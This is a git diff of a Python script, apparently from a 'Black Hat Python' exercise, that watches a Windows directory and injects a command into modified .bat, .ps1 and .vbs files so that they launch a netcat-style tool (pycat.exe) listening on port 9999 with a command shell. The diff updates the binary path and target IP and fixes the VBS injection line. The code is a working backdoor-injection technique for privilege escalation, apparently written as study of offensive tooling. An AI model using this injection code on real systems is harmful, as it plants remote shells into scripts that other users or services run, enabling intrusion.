@@ -10,15 +10,15 @@ FILE_MODIFIED = 3
 FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
 
-BIN = 'c:\\users\\eric\\desktop\\netcat.ext'
-TGT_IP = '192.168.127.132'
+BIN = 'C:\\Users\\eric\\Desktop\\repos\\black-hat-python\\basic_networking\\dist\\pycat.exe'
+TGT_IP = '192.168.127.130'
 CMD = f'{BIN} -t {TGT_IP} -p 9999 -l -c'
 
 # file extensions to monitor and code to inject for each type, use marker to prevent multiple injections
 FILE_TYPES = {
     '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
     '.ps1': ["\r\n# bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
-    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run "{CMD}")\r\n'],
+    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
 }
 
 FILE_LIST_DIRECTORY = 0x0001
@@ -81,21 +81,10 @@ def monitor(path_to_watch):
                         # inject code into modified file
                         if extension in FILE_TYPES:
                             inject_code(full_filename, contents, extension)
-                        print(contents)
+                        # print(contents)
                         print('[^^^] End of file contents')
                     except Exception as e:                        
                         print(f'[!!!] Could not read file for injection: {e}')
-
-                    # try:
-                        
-                    #     # dump contents of modified file to console
-                    #     with open(full_filename, 'r') as f:
-                    #         contents = f.read()
-                    #         print(contents)
-                    #         print('[^^^] End of file contents')
-                    # except Exception as e:
-                    #     print(f'[!!!] Could not read file: {e}')
-
                 elif action == FILE_RENAMED_FROM:
                     print(f'[>] Renamed from: {full_filename}')
                 elif action == FILE_RENAMED_TO:
